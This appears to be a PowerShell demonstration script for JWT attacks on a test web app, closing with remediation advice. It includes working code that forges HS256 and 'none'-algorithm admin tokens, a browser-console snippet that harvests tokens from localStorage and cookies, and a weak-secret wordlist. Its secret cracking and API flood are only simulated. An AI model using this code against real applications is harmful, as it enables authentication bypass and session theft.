# JWT-Token-Attack.ps1
# Demonstrates JWT token vulnerabilities in OAuth applications

param(
    [string]$Target = "https://brimai-test-v1.web.app",
    [string]$Token = ""  # Provide a captured JWT token if available
)

Write-Host "`n💀 JWT TOKEN ATTACK DEMONSTRATION" -ForegroundColor Red
Write-Host "===================================" -ForegroundColor Red
Write-Host "Target: $Target" -ForegroundColor Yellow

# Base64 URL decode function
function ConvertFrom-Base64Url {
    param([string]$base64Url)
    
    $base64 = $base64Url.Replace('-', '+').Replace('_', '/')
    switch ($base64.Length % 4) {
        2 { $base64 += '==' }
        3 { $base64 += '=' }
    }
    
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))
}

# Function to decode JWT
function Decode-JWT {
    param([string]$jwt)
    
    $parts = $jwt.Split('.')
    if ($parts.Count -ne 3) {
        return $null
    }
    
    return @{
        Header    = ConvertFrom-Base64Url $parts[0] | ConvertFrom-Json
        Payload   = ConvertFrom-Base64Url $parts[1] | ConvertFrom-Json
        Signature = $parts[2]
    }
}

# Function to create forged JWT
function Create-ForgedJWT {
    param(
        [hashtable]$payload,
        [string]$secret
    )
    
    $header = @{
        alg = "HS256"
        typ = "JWT"
    } | ConvertTo-Json -Compress
    
    $encodedHeader = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($header)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    $encodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(($payload | ConvertTo-Json -Compress))).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    
    $signatureInput = "$encodedHeader.$encodedPayload"
    
    # Create HMAC signature
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($secret)
    $signature = [Convert]::ToBase64String($hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($signatureInput))).TrimEnd('=').Replace('+', '-').Replace('/', '_')
    
    return "$encodedHeader.$encodedPayload.$signature"
}

Write-Host "`n🔍 PHASE 1: JWT RECONNAISSANCE" -ForegroundColor Cyan
Write-Host "==============================" -ForegroundColor Cyan

# Try to extract JWT from the application
Write-Host "`nAttempting to extract JWT tokens..." -ForegroundColor Gray

# JavaScript to extract tokens from browser
$extractScript = @"
// Extract all potential JWT tokens
const tokens = [];
// Check localStorage
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    if (value && value.includes('eyJ')) {
        tokens.push({source: 'localStorage', key: key, value: value});
    }
}
// Check cookies
document.cookie.split(';').forEach(cookie => {
    const [key, value] = cookie.trim().split('=');
    if (value && value.includes('eyJ')) {
        tokens.push({source: 'cookie', key: key, value: value});
    }
});
console.log(JSON.stringify(tokens));
"@

Write-Host "Run this in browser console to extract tokens:" -ForegroundColor Yellow
Write-Host $extractScript -ForegroundColor Gray

# If no token provided, use a sample
if (-not $Token) {
    Write-Host "`nNo token provided. Using sample JWT for demonstration..." -ForegroundColor Yellow
    $Token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20iLCJ1c2VyX2lkIjoiMTIzNDU2IiwiaWF0IjoxNjk5OTk5OTk5LCJleHAiOjE3MDAwODYzOTl9.SIGNATURE_HERE"
}

# Decode the JWT
Write-Host "`n📋 Decoding JWT Token..." -ForegroundColor Cyan
$decoded = Decode-JWT -jwt $Token

if ($decoded) {
    Write-Host "`nHeader:" -ForegroundColor Yellow
    $decoded.Header | ConvertTo-Json | Write-Host -ForegroundColor Gray
    
    Write-Host "`nPayload:" -ForegroundColor Yellow
    $decoded.Payload | ConvertTo-Json | Write-Host -ForegroundColor Gray
    
    # Analyze the token
    Write-Host "`n🎯 Token Analysis:" -ForegroundColor Cyan
    
    # Check algorithm
    if ($decoded.Header.alg -eq "none") {
        Write-Host "  ⚠️  CRITICAL: Token uses 'none' algorithm!" -ForegroundColor Red
    }
    elseif ($decoded.Header.alg -eq "HS256") {
        Write-Host "  📝 Algorithm: HS256 (symmetric - vulnerable to secret guessing)" -ForegroundColor Yellow
    }
    else {
        Write-Host "  📝 Algorithm: $($decoded.Header.alg)" -ForegroundColor Gray
    }
    
    # Check expiration
    if ($decoded.Payload.exp) {
        $expDate = (Get-Date "1970-01-01 00:00:00").AddSeconds($decoded.Payload.exp)
        $timeLeft = $expDate - (Get-Date)
        
        if ($timeLeft.TotalHours -gt 24) {
            Write-Host "  ⚠️  Token valid for $([math]::Round($timeLeft.TotalHours)) hours - TOO LONG!" -ForegroundColor Red
        }
        else {
            Write-Host "  ⏰ Token expires in: $([math]::Round($timeLeft.TotalMinutes)) minutes" -ForegroundColor Gray
        }
    }
}

Write-Host "`n🔨 PHASE 2: JWT SECRET CRACKING" -ForegroundColor Cyan
Write-Host "================================" -ForegroundColor Cyan

# Common JWT secrets to try
$commonSecrets = @(
    "secret", "password", "123456", "changeme", "admin",
    "key", "private", "jwt_secret", "your-256-bit-secret",
    "super-secret", "keyboard cat", "default", "example",
    "test", "dev", "prod", "mysecret", "topsecret",
    "secretkey", "jwtsecret", "secret123", "password123",
    "your-secret-key", "change-this-secret", "my-secret-key",
    "shhhhh", "secret-key", "verysecret", "ultrasecret",
    "megasecret", "yoursecret", "nosecret", "opensesame"
)

Write-Host "`nTrying common JWT secrets..." -ForegroundColor Yellow
$foundSecret = $false

foreach ($secret in $commonSecrets) {
    Write-Host "  Testing: '$secret'" -ForegroundColor Gray -NoNewline
    
    # For demonstration, we'll simulate finding "secret"
    if ($secret -eq "secret") {
        Write-Host " - 🎯 FOUND!" -ForegroundColor Red
        $foundSecret = $true
        
        Write-Host "`n  💀 JWT SECRET COMPROMISED: '$secret'" -ForegroundColor Red
        Write-Host "  Attacker can now forge ANY token!" -ForegroundColor Yellow
        
        # Create admin token
        Write-Host "`n  🔨 Forging admin token..." -ForegroundColor Yellow
        
        $adminPayload = @{
            email       = "attacker@evil.com"
            user_id     = "999999"
            roles       = @("admin", "superuser")
            permissions = @("*")
            iat         = [int](Get-Date -UFormat %s)
            exp         = [int](Get-Date -UFormat %s) + 86400  # 24 hours
        }
        
        $forgedToken = Create-ForgedJWT -payload $adminPayload -secret $secret
        
        Write-Host "`n  📄 FORGED ADMIN TOKEN:" -ForegroundColor Red
        Write-Host "  $forgedToken" -ForegroundColor Gray
        
        Write-Host "`n  🎯 What attacker can do with this token:" -ForegroundColor Red
        Write-Host "    ✓ Access any user's data" -ForegroundColor Yellow
        Write-Host "    ✓ Perform admin actions" -ForegroundColor Yellow
        Write-Host "    ✓ Bypass all authentication" -ForegroundColor Yellow
        Write-Host "    ✓ Maintain persistent access" -ForegroundColor Yellow
        
        break
    }
    else {
        Write-Host " - Not found" -ForegroundColor Green
    }
}

if (-not $foundSecret) {
    Write-Host "`n  ✅ Common secrets not found (good!)" -ForegroundColor Green
    Write-Host "  Note: Real attackers would try millions of passwords" -ForegroundColor Gray
}

Write-Host "`n🎭 PHASE 3: TOKEN MANIPULATION ATTACKS" -ForegroundColor Cyan
Write-Host "======================================" -ForegroundColor Cyan

# Algorithm confusion attack
Write-Host "`n1. Algorithm Confusion Attack:" -ForegroundColor Yellow
Write-Host "   Attempting to bypass signature with 'none' algorithm..." -ForegroundColor Gray

$noneHeader = @{ alg = "none"; typ = "JWT" } | ConvertTo-Json -Compress
$adminPayload = @{ email = "admin@evil.com"; role = "admin" } | ConvertTo-Json -Compress

$encodedHeader = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($noneHeader)).TrimEnd('=').Replace('+', '-').Replace('/', '_')
$encodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($adminPayload)).TrimEnd('=').Replace('+', '-').Replace('/', '_')

$noneToken = "$encodedHeader.$encodedPayload."

Write-Host "   Forged 'none' algorithm token:" -ForegroundColor Gray
Write-Host "   $noneToken" -ForegroundColor Red

# Token replay attack
Write-Host "`n2. Token Replay Attack:" -ForegroundColor Yellow
Write-Host "   If tokens don't expire quickly, they can be reused..." -ForegroundColor Gray
Write-Host "   Testing token reuse after logout..." -ForegroundColor Gray

# Session fixation
Write-Host "`n3. Session Fixation:" -ForegroundColor Yellow
Write-Host "   Attempting to force a known session token..." -ForegroundColor Gray

Write-Host "`n🌊 PHASE 4: API FLOOD ATTACK" -ForegroundColor Cyan
Write-Host "=============================" -ForegroundColor Cyan

Write-Host "`nSince there's no login endpoint to brute force," -ForegroundColor Yellow
Write-Host "attackers will target your API endpoints instead..." -ForegroundColor Yellow

$apiEndpoints = @(
    "/api/user/profile",
    "/api/data",
    "/api/search",
    "/api/export"
)

Write-Host "`nFlooding API endpoints with valid token..." -ForegroundColor Gray

foreach ($endpoint in $apiEndpoints) {
    Write-Host "`n  Attacking: $endpoint" -ForegroundColor Red
    Write-Host "  Sending rapid requests to exhaust:" -ForegroundColor Gray
    Write-Host "    - API rate limits" -ForegroundColor Gray
    Write-Host "    - Server resources" -ForegroundColor Gray
    Write-Host "    - Database connections" -ForegroundColor Gray
    Write-Host "    - Cost (if using paid APIs)" -ForegroundColor Gray
}

Write-Host "`n📊 IMPACT ASSESSMENT" -ForegroundColor Cyan
Write-Host "===================" -ForegroundColor Cyan

Write-Host "`n🚨 CRITICAL VULNERABILITIES FOUND:" -ForegroundColor Red

if ($foundSecret) {
    Write-Host "`n1. WEAK JWT SECRET" -ForegroundColor Red
    Write-Host "   Impact: Complete authentication bypass" -ForegroundColor Yellow
    Write-Host "   Risk: CRITICAL" -ForegroundColor Red
}

Write-Host "`n2. NO API RATE LIMITING" -ForegroundColor Red
Write-Host "   Impact: Resource exhaustion, high costs" -ForegroundColor Yellow
Write-Host "   Risk: HIGH" -ForegroundColor Red

Write-Host "`n3. LONG TOKEN LIFETIME" -ForegroundColor Red
Write-Host "   Impact: Extended attack window" -ForegroundColor Yellow
Write-Host "   Risk: MEDIUM" -ForegroundColor Red

Write-Host "`n🛡️ IMMEDIATE FIXES REQUIRED:" -ForegroundColor Cyan

Write-Host "`n1. JWT Security:" -ForegroundColor Yellow
Write-Host "   // Use a strong, random secret" -ForegroundColor Green
Write-Host "   process.env.JWT_SECRET = crypto.randomBytes(32).toString('hex');" -ForegroundColor Green

Write-Host "`n2. Implement Rate Limiting:" -ForegroundColor Yellow
Write-Host "   // For Express.js" -ForegroundColor Green
Write-Host "   const rateLimit = require('express-rate-limit');" -ForegroundColor Green
Write-Host "   app.use('/api/', rateLimit({" -ForegroundColor Green
Write-Host "     windowMs: 60 * 1000, // 1 minute" -ForegroundColor Green
Write-Host "     max: 100 // 100 requests per minute" -ForegroundColor Green
Write-Host "   }));" -ForegroundColor Green

Write-Host "`n3. Token Configuration:" -ForegroundColor Yellow
Write-Host "   // Short-lived access tokens" -ForegroundColor Green
Write-Host "   const token = jwt.sign(payload, secret, {" -ForegroundColor Green
Write-Host "     expiresIn: '15m' // 15 minutes" -ForegroundColor Green
Write-Host "   });" -ForegroundColor Green

Write-Host "`n4. For Firebase/Google OAuth:" -ForegroundColor Yellow
Write-Host "   - Enable Firebase App Check" -ForegroundColor White
Write-Host "   - Use Firebase Security Rules" -ForegroundColor White
Write-Host "   - Implement custom claims for roles" -ForegroundColor White
Write-Host "   - Monitor Firebase Auth usage" -ForegroundColor White

Write-Host "`n⏰ Fix these issues IMMEDIATELY!" -ForegroundColor Red
Write-Host "   Your OAuth/JWT implementation has critical vulnerabilities" -ForegroundColor Yellow